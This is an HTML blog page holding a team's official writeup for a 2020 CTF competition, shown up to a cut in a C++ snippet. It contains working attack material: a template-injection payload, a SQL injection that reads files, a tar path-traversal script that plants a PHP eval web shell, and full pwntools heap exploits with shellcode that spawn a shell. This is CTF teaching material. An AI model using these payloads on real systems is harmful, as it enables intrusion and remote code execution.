<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2020-Taihuctf-writeup | Asuri Team</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="太湖杯官方writeupAsuri第一次举办对外的比赛，题目逆向和密码学质量相对较高，web和misc比较容易。因为我们失职，比赛中没有使用动态容器，也是非常非常感谢做出来的师傅没有搅屎Orz">
<meta property="og:type" content="article">
<meta property="og:title" content="2020-Taihuctf-writeup">
<meta property="og:url" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/index.html">
<meta property="og:site_name" content="Asuri Team">
<meta property="og:description" content="太湖杯官方writeupAsuri第一次举办对外的比赛，题目逆向和密码学质量相对较高，web和misc比较容易。因为我们失职，比赛中没有使用动态容器，也是非常非常感谢做出来的师傅没有搅屎Orz">
<meta property="og:locale">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/checkin.png">
<meta property="og:image" content="https://i.loli.net/2020/09/17/QfkeKPX7syrVg5i.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/PLD.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/PLD2.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise1.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise2.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise3.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise4.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise5.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise6.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise7.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise9.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise10.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/omise11.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/pdfstreamdumper.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/protein.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/broken2.png">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/broken1.jpg">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/broken3.jpg">
<meta property="og:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/wp01.png">
<meta property="article:published_time" content="2020-11-24T14:00:45.000Z">
<meta property="article:modified_time" content="2023-04-07T12:29:53.446Z">
<meta property="article:author" content="All Members">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/checkin.png">
  
    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  

<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <div id="container">
    

    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Asuri Team</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/members">Members</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-2020-Taihuctf-writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/24/2020-Taihuctf-writeup/" class="article-date">
  <time datetime="2020-11-24T14:00:45.000Z" itemprop="datePublished">2020-11-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2020-Taihuctf-writeup
    </h1>
  


  <div class="article-author">
    <img src="https://www.gravatar.com/avatar/f4436263f3150c6b60b87869224e99e3?s=48">
    <div class="article-author-info">
      <a href="/author/l1nk" class="article-author-name">l1nk</a>
      <a target="_blank" rel="noopener" href="http://showlinkroom.me/" class="article-author-site" title="Visit the author's site">[site]</a>
      <div class="article-author-about" title="想要混入安全圈的菜鸡，只会搞简单的bin">想要混入安全圈的菜鸡，只会搞简单的bin</div>
    </div>
  </div>


      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="太湖杯官方writeup"><a href="#太湖杯官方writeup" class="headerlink" title="太湖杯官方writeup"></a>太湖杯官方writeup</h2><p>Asuri第一次举办对外的比赛，题目逆向和密码学质量相对较高，web和misc比较容易。<br>因为我们失职，比赛中没有使用动态容器，也是非常非常感谢做出来的师傅没有搅屎Orz</p>
<a id="more"></a>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p><img src="/2020/11/24/2020-Taihuctf-writeup/checkin.png"><br>拼手速的游戏。其实也可以通过修改时间让游戏变慢更快得到flag，各自想办法即可~</p>
<h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p>unicode规范化参考网址 <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a><br>通过unicode字符规范化来绕过字符检查</p>
<p><code>︷︷ config.__class__.__init__.__globals__[＇os＇].popen(＇cat /flag＇).read() ︸︸</code></p>
<h3 id="cross-the-filesystem-field"><a href="#cross-the-filesystem-field" class="headerlink" title="cross the filesystem field"></a>cross the filesystem field</h3><p>简单的sql注入读源码,双写绕过即可<br><code>?id=1%20uniunionon%20seselectlect%20load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870) </code><br>读到源码后发现目录穿越考点，直接用的python自带的tar, 可以解压目录穿越出去</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile </span><br><span class="line"><span class="keyword">import</span> io <span class="keyword">import</span> requests </span><br><span class="line">z_file = tarfile.<span class="built_in">open</span>(<span class="string">&quot;test.tar&quot;</span>, mode=<span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">z_info = tarfile.TarInfo(<span class="string">&quot;../../../../../../var/www/html/upload/pwned.php&quot;</span>) </span><br><span class="line">b = <span class="string">b&#x27;&lt;?php eval($_REQUEST[&quot;cmd&quot;]);?&gt;&#x27;</span> </span><br><span class="line">z_info.size = <span class="built_in">len</span>(b) </span><br><span class="line">z_file.addfile(z_info, io.BytesIO(b)) </span><br><span class="line">z_file.close()</span><br></pre></td></tr></table></figure>
<p>修改 submit 到 submit1 上传上去, upload/pwned.php 就是 shell</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="easyKooc"><a href="#easyKooc" class="headerlink" title="easyKooc"></a>easyKooc</h3><p>利用leave message 泄露cannary然后double free申请到栈上的地址控制程序执行chunk块内的shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># sh= process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/mipsel-linux-gnu/&quot;,&quot;./pwn&quot;])</span></span><br><span class="line"><span class="comment"># sh = process([&quot;qemu-mipsel&quot;, &quot;-L&quot;, &quot;/usr/mipsel-linux-gnu/&quot;,&quot;./pwn&quot;])</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.update(bits = <span class="number">32</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Write</span>(<span class="params">Until, Text</span>):</span></span><br><span class="line">    sh.sendlineafter(Until, Text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params"><span class="built_in">id</span>, content</span>):</span> </span><br><span class="line">    Write(<span class="string">&#x27;Plz input your choice\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    Write(<span class="string">&#x27;Plz input your todo id!\n&#x27;</span>, <span class="built_in">id</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;input your content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    Write(<span class="string">&#x27;Plz input your choice\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    Write(<span class="string">&#x27;Plz input your todo id!\n&#x27;</span>, <span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">Content</span>) :</span></span><br><span class="line">    Write(<span class="string">&#x27;Plz input your choice\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;What message do you want to leave?\n&#x27;</span>, Content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Write(<span class="string">&quot;Plz input your motto!\n&quot;</span>, shellcode)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;gift for you: &#x27;</span>)</span><br><span class="line">Stack_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Stack_addr: &#x27;</span> + <span class="built_in">hex</span>(Stack_addr))</span><br><span class="line">Edit(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x21</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#Write(&#x27;Plz input your choice\n&#x27;, &#x27;4&#x27;)</span></span><br><span class="line">canary = u32(sh.recv(<span class="number">4</span>)) - <span class="number">0x61</span></span><br><span class="line">log.success(<span class="string">&#x27;canary: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x1c</span> + p32(<span class="number">0x41</span>)</span><br><span class="line">Edit(payload)</span><br><span class="line"></span><br><span class="line">fake_chunk = Stack_addr + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">Add(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">Add(<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">Delete(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">Delete(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">Delete(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="string">&#x27;3&#x27;</span>, p32(fake_chunk))</span><br><span class="line">Add(<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;your content is: &#x27;</span>)</span><br><span class="line">heapbase = u32(sh.recv(<span class="number">4</span>)) &amp; <span class="number">0xFFFFFF00</span></span><br><span class="line">log.success(<span class="string">&#x27;heapbase: &#x27;</span> + <span class="built_in">hex</span>(heapbase))</span><br><span class="line">Add(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">Add(<span class="string">&#x27;6&#x27;</span>, p32(canary) + p32(<span class="number">0x0</span>) + p32(heapbase + <span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line">Write(<span class="string">&#x27;Plz input your choice\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="sevenhero"><a href="#sevenhero" class="headerlink" title="sevenhero"></a>sevenhero</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;119.3.89.93&#x27;</span>, <span class="number">8011</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input your choice:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input your choice:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>):</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;error!\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input your choice:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input your choice:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">group</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input your choice:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    add(i, <span class="number">0x50</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    remove(i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">14</span>):</span><br><span class="line">    remove(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">heapbase = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) -<span class="number">0x460</span></span><br><span class="line">log.success(<span class="string">&#x27;heapbase: &#x27;</span> + <span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, <span class="number">0x50</span>, p64(heapbase+<span class="number">0x250</span>))</span><br><span class="line">group()</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x50</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">group()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;gift: &#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">0x264140</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span>+ <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">free_hook = libcbase + <span class="number">0x1e75a8</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x52fd0</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;string: &#x27;</span>)</span><br><span class="line">sh.sendline(p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x50</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">9</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">9</span>, <span class="number">0x50</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;string: &#x27;</span>)</span><br><span class="line">sh.sendline(p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;string: &#x27;</span>)</span><br><span class="line">sh.sendline(p64(system_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">remove(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="manager"><a href="#manager" class="headerlink" title="manager"></a>manager</h3><p>先利用Hash的溢出和爆破来Login<br>这里Hash采用的是base进制, base取了37, 且是unsinged long long 自然溢出.<br><img src="https://i.loli.net/2020/09/17/QfkeKPX7syrVg5i.png"></p>
<p>利用realloc(ptr,0) == free(ptr)的特点 进行doublefree 利用，由于题目开启了seccomp，禁用了execve，并且禁用了free_hook，因此选择泄露environ，并且用栈迁移到堆区写好的rop链上做ORW获取flag.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull; </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Len = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">500001</span>];</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100005</span>];</span><br><span class="line">ull Ans0; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Cmp</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Len; ++i)</span><br><span class="line">          <span class="keyword">if</span> (s[i] != s[x + i]) &#123;</span><br><span class="line">               flag = <span class="literal">false</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">     <span class="keyword">if</span> (flag) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> Ans = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Len; ++i)</span><br><span class="line">          Ans = Ans * <span class="number">37</span> + s[x + i];</span><br><span class="line">     <span class="keyword">return</span> Ans == Ans0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> len=<span class="number">1</span>;</span><br><span class="line">     a[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">     <span class="keyword">int</span> i;</span><br><span class="line">     <span class="keyword">while</span>(len&lt;=<span class="number">100000</span>)</span><br><span class="line">     &#123;</span><br><span class="line">          <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">          &#123;</span><br><span class="line">               <span class="keyword">if</span>(a[i]==<span class="number">1</span>)</span><br><span class="line">                    a[i+len]=<span 